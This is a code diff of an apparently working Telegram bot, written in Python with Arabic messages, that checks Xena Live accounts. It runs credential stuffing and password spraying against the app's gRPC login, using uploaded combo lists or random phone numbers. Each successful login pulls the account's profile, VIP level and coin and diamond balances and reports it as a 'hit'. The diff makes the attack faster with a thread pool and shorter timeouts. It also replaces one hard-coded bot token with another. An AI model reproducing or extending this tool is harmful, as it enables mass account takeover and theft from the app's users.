@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # ╔══════════════════════════════════════════════════════════╗
-# ║    📱  Xena Live — Telegram Bot Checker v2.6            ║
+# ║    📱  Xena Live — Telegram Bot Checker v2.7            ║
 # ╚══════════════════════════════════════════════════════════╝
 
 import os
@@ -10,6 +10,7 @@ import random
 import hashlib
 import struct
 import threading
+from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 
 import grpc
@@ -18,7 +19,7 @@ import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # ضع توكن البوت الخاص بك هنا
-BOT_TOKEN = "8643610223:AAHv_lLXfFgju-AVMNMMbplU47EkJlIHhfY"
+BOT_TOKEN = "8845567682:AAFYWQ2z_avCQ1ZcD-DfJY1kJaLAkAxSsn0"
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # ══════════════════════════════════════════════════════════
@@ -179,7 +180,7 @@ class GrpcClient:
         self._profile = self._ch.unary_unary("/grpc.user.UserService/GetUserProfile", request_serializer=lambda x: x, response_deserializer=lambda x: x)
         self._balance = self._ch.unary_unary("/grpc.purchase.PurchaseService/GetBalance", request_serializer=lambda x: x, response_deserializer=lambda x: x)
 
-    def call(self, stub, payload, extra_meta=None, timeout=12.0):
+    def call(self, stub, payload, extra_meta=None, timeout=10.0):
         meta = list(_make_meta(self.did))
         if extra_meta: meta.extend(extra_meta)
         if payload is None: payload = b""
@@ -190,7 +191,7 @@ class GrpcClient:
             code = e.code()
             if code == grpc.StatusCode.DEADLINE_EXCEEDED: return None, "timeout"
             if code == grpc.StatusCode.UNAUTHENTICATED: return None, "grpc(16)"
-            return None, f"grpc({code.value[0]}:{e.details()})"
+            return None, f"grpc({code.value[0]}):{e.details()}"
 
     def close(self):
         try: self._ch.close()
@@ -236,7 +237,7 @@ def _parse_login(data):
 
 def _do_login(cli, phone, pw, country):
     payload = _build_login(phone, pw, country)
-    data, err = cli.call(cli._login, payload, timeout=6.0)
+    data, err = cli.call(cli._login, payload, timeout=5.0)
     if err:
         if err == "timeout": return {"status": "timeout"}
         if "grpc(16)" in err: return {"status": "fail"}
@@ -259,7 +260,7 @@ def _fetch_info(cli, short_uid, token):
     uid_s = str(short_uid)
     body = _fint(1, short_uid)
     extra = [("x-auth-token", token), ("uid", uid_s)]
-    data, err = cli.call(cli._info, body, extra_meta=extra, timeout=6.0)
+    data, err = cli.call(cli._info, body, extra_meta=extra, timeout=5.0)
     if err or not data: return {}
     top = _proto(data)
     f2 = _fget(top, 2)
@@ -272,10 +273,10 @@ def _fetch_info(cli, short_uid, token):
     f = _fget(inner, 12)
     if f and f[2] > 0: info["regDate"] = datetime.fromtimestamp(f[2]).strftime("%Y-%m-%d")
 
-    data2, err2 = cli.call(cli._profile, body, extra_meta=extra, timeout=6.0)
+    data2, err2 = cli.call(cli._profile, body, extra_meta=extra, timeout=5.0)
     info["vipLevel"] = _find_vip(data2) if not err2 and data2 else ""
     
-    d_data, d_err = cli.call(cli._balance, None, extra_meta=extra, timeout=6.0)
+    d_data, d_err = cli.call(cli._balance, None, extra_meta=extra, timeout=5.0)
     dia = coins = gold = 0
     if not d_err and d_data:
         for fn, wt, iv, _ in _proto(d_data):
@@ -335,7 +336,7 @@ def send_welcome(message):
     markup.add(
         InlineKeyboardButton("🔍 فحص حساب مفرد", callback_data="single_check"),
         InlineKeyboardButton("📁 فحص ملف كومبو (TXT)", callback_data="combo_check"),
-        InlineKeyboardButton("⚡ فحص تلقائي عشوائي (جميع الدول - لا نهائي)", callback_data="auto_check")
+        InlineKeyboardButton("⚡ فحص تلقائي عشوائي (فائق السرعة - لا نهائي)", callback_data="auto_check")
     )
     bot.reply_to(message, "أهلاً بك في بوت فحص حسابات Xena Live.\nاختر أحد خيارات التحكم أدناه:", reply_markup=markup)
 
@@ -343,12 +344,11 @@ def send_welcome(message):
 def callback_query(call):
     chat_id = call.message.chat.id
     
-    # معالجة طلب إيقاف الفحص (سواء كومبو أو عشوائي)
     if call.data.startswith("stop_combo_") or call.data.startswith("stop_auto_"):
         target_chat_id = int(call.data.split("_")[2])
         if target_chat_id in stop_events:
             stop_events[target_chat_id].set()
-            bot.answer_callback_query(call.id, "⚠️ جارِ إيقاف الفحص...")
+            bot.answer_callback_query(call.id, "⚠️ جارِ إيقاف الفحص الفائق...")
         else:
             bot.answer_callback_query(call.id, "ℹ️ لا يوجد فحص نشط حالياً.")
         return
@@ -360,12 +360,11 @@ def callback_query(call):
         user_states[chat_id] = "waiting_combo"
         bot.send_message(chat_id, "📁 قم برفع ملف الكومبو بصيغة `.txt`\n(يجب أن يكون كل سطر بصيغة `رقم:باسورد` أو `رقم` فقط).")
     elif call.data == "auto_check":
-        # إنشاء حدث إيقاف جديد خاص بالفحص التلقائي الشامل اللاانهائي لهذا المستخدم
         stop_event = threading.Event()
         stop_events[chat_id] = stop_event
         
-        bot.send_message(chat_id, "⚡ جارِ تجهيز وبدء الفحص التلقائي العشوائي لجميع الدول (حلقة لا نهائية)...")
-        threading.Thread(target=run_auto_checker_all_countries, args=(chat_id, stop_event), daemon=True).start()
+        bot.send_message(chat_id, "⚡ جارِ بدء الفحص التلقائي العشوائي (فائق السرعة - تعدد المسارات)...")
+        threading.Thread(target=run_fast_auto_checker, args=(chat_id, stop_event), daemon=True).start()
 
 @bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id] == "waiting_single")
 def process_single(message):
@@ -490,7 +489,7 @@ def run_combo_checker(chat_id, file_path, stop_event):
                     last_update = idx
                 except:
                     pass
-                time.sleep(0.2)
+                time.sleep(0.1)
         
         if not stop_event.is_set():
             try:
@@ -510,31 +509,33 @@ def run_combo_checker(chat_id, file_path, stop_event):
         if os.path.exists(file_path):
             os.remove(file_path)
 
-def run_auto_checker_all_countries(chat_id, stop_event):
-    cli = GrpcClient()
-    scanned_count = 0
-    hits_count = 0
-    errors_count = 0
+def run_fast_auto_checker(chat_id, stop_event):
+    scanned_count = [0]
+    hits_count = [0]
+    errors_count = [0]
+    stats_lock = threading.Lock()
     
     countries = list(COUNTRY_MAP.keys())
     
-    # إنشاء زر إيقاف الفحص التلقائي اللاانهائي
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("🛑 إيقاف الفحص التلقائي", callback_data=f"stop_auto_{chat_id}"))
+    markup.add(InlineKeyboardButton("🛑 إيقاف الفحص السريع", callback_data=f"stop_auto_{chat_id}"))
     
     status_msg = bot.send_message(
         chat_id,
-        f"⚡ **بدء الفحص التلقائي العشوائي الشامل (جميع الدول - لا نهائي)...**\n"
-        f"🌍 الدول المفحوصة: `تلقائي (عشوائي)`\n"
+        f"⚡ **بدء الفحص التلقائي فائق السرعة (جميع الدول - لا نهائي)...**\n"
+        f"🚀 الحالة: `يعمل بتعدد المسارات (Multi-threaded)`\n"
         f"⏳ إجمالي الأرقام المفحوصة: `0`\n"
         f"🎯 الـ Hits: `0` | ⚠️ الأخطاء: `0`",
         parse_mode="Markdown",
         reply_markup=markup
     )
     
-    try:
-        # حلقة لا نهائية تعمل حتى يضغط المستخدم زر الإيقاف
-        while not stop_event.is_set():
+    def worker_task():
+        if stop_event.is_set():
+            return
+        
+        cli = GrpcClient()
+        try:
             cc = random.choice(countries)
             c_info = COUNTRY_MAP[cc]
             
@@ -543,7 +544,8 @@ def run_auto_checker_all_countries(chat_id, stop_event):
             local = pref + ext
             phone = c_info["code"] + "-" + local
             
-            scanned_count += 1
+            with stats_lock:
+                scanned_count[0] += 1
             
             passwords_to_try = [f"0{local}"] + PASSWORDS
             for idx, pw in enumerate(passwords_to_try):
@@ -554,47 +556,73 @@ def run_auto_checker_all_countries(chat_id, stop_event):
                 status = r.get("status")
                 
                 if status == "error":
-                    errors_count += 1
+                    with stats_lock:
+                        errors_count[0] += 1
                 elif status == "hit":
-                    hits_count += 1
+                    with stats_lock:
+                        hits_count[0] += 1
                     acct = _fetch_info(cli, r.get("shortUID", 0), r.get("token", ""))
-                    msg = format_hit_msg(phone, pw, r, acct, via=f"AUTO_{cc}_" + ("SPRAY" if idx > 0 else "DIR"))
+                    msg = format_hit_msg(phone, pw, r, acct, via=f"FAST_{cc}_" + ("SPRAY" if idx > 0 else "DIR"))
                     bot.send_message(chat_id, msg, parse_mode="Markdown")
                     break
-                
-                time.sleep(0.1)
+        except Exception:
+            with stats_lock:
+                errors_count[0] += 1
+        finally:
+            cli.close()
+
+    # استخدام ThreadPoolExecutor لتشغيل عدة عمليات فحص في نفس الوقت وبسرعة فائقة
+    with ThreadPoolExecutor(max_workers=6) as executor:
+        last_edit_time = time.time()
+        while not stop_event.is_set():
+            # إرسال مهام فحص جديدة للمسارات
+            futures = [executor.submit(worker_task) for _ in range(3)]
             
-            # تحديث العد الحي والنتائج والأخطاء في رسالة الحالة بشكل مستمر
-            try:
-                bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=status_msg.message_id,
-                    text=f"⚡ **جارِ الفحص التلقائي العشوائي (جميع الدول - لا نهائي)...**\n"
-                         f"🌍 الدولة الحالية: `{cc}` | الرقم: `{phone}`\n"
-                         f"⏳ إجمالي الأرقام المفحوصة: `{scanned_count}`\n"
-                         f"🎯 الـ Hits: `{hits_count}` | ⚠️ الأخطاء: `{errors_count}`",
-                    parse_mode="Markdown",
-                    reply_markup=markup
-                )
-            except:
-                pass
+            # انتظار إكمال الدفعة الحالية
+            for f in concurrent.futures.as_completed(futures):
+                if stop_event.is_set():
+                    break
             
-            time.sleep(0.2)
-        
-        # رسالة عند إيقاف الفحص من قِبل المستخدم
-        if stop_event.is_set():
+            # تحديث شاشة الحالة بانتظام (كل ثانية تقريباً لضمان السلاسة وعدم حظر التيليجرام)
+            if time.time() - last_edit_time >= 1.0:
+                with stats_lock:
+                    s_cnt = scanned_count[0]
+                    h_cnt = hits_count[0]
+                    e_cnt = errors_count[0]
+                try:
+                    bot.edit_message_text(
+                        chat_id=chat_id,
+                        message_id=status_msg.message_id,
+                        text=f"⚡ **جارِ الفحص التلقائي فائق السرعة (جميع الدول)...**\n"
+                             f"🚀 الحالة: `نشط وفعّال (أداء عالي)`\n"
+                             f"⏳ إجمالي الأرقام المفحوصة: `{s_cnt}`\n"
+                             f"🎯 الـ Hits: `{h_cnt}` | ⚠️ الأخطاء: `{e_cnt}`",
+                        parse_mode="Markdown",
+                        reply_markup=markup
+                    )
+                except:
+                    pass
+                last_edit_time = time.time()
+            
+            time.sleep(0.05)
+
+    if stop_event.is_set():
+        with stats_lock:
+            s_cnt = scanned_count[0]
+            h_cnt = hits_count[0]
+            e_cnt = errors_count[0]
+        try:
             bot.send_message(
                 chat_id, 
-                f"🛑 **تم إيقاف الفحص التلقائي الشامل بناءً على طلبك!**\n"
-                f"📊 إجمالي الأرقام المفحوصة: `{scanned_count}`\n"
-                f"🎯 إجمالي الـ Hits: `{hits_count}` | ⚠️ إجمالي الأخطاء: `{errors_count}`", 
+                f"🛑 **تم إيقاف الفحص فائق السرعة بناءً على طلبك!**\n"
+                f"📊 إجمالي الأرقام المفحوصة: `{s_cnt}`\n"
+                f"🎯 إجمالي الـ Hits: `{h_cnt}` | ⚠️ إجمالي الأخطاء: `{e_cnt}`", 
                 parse_mode="Markdown"
             )
-    except Exception as e:
-        bot.send_message(chat_id, f"⚠️ حدث خطأ أثناء الفحص التلقائي الشامل: {e}")
-    finally:
-        cli.close()
-        stop_events.pop(chat_id, None)
+        except:
+            pass
+    
+    stop_events.pop(chat_id, None)
 
 if __name__ == "__main__":
     print("🤖 Bot is running...")
